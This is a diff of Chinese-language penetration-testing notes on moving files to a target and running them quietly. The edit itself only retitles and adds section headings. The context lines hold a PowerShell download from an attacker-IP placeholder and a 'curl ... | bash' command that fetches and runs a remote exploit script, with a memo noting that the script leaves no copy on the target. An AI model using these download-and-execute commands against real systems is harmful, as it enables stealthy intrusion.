@@ -240,9 +240,9 @@ powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://攻方IP/e
 * `-NoProfile`: 在执行过程中不加载 PowerShell 用户配置文件。
 * `-File wget.ps1`: 指定要执行的 PowerShell 脚本文件，这里假设文件名为 wget.ps1。
 
-## 隐蔽
+## 隐蔽方式
 
-## 方式
+### 方法1：
 
 ```bash
 // Attacker
@@ -255,3 +255,6 @@ curl http://攻方IP:8888/利用脚本.sh | bash
 ```
 
 MEMO：该利用脚本不会被保存在目标系统中
+
+### 方法2：
+
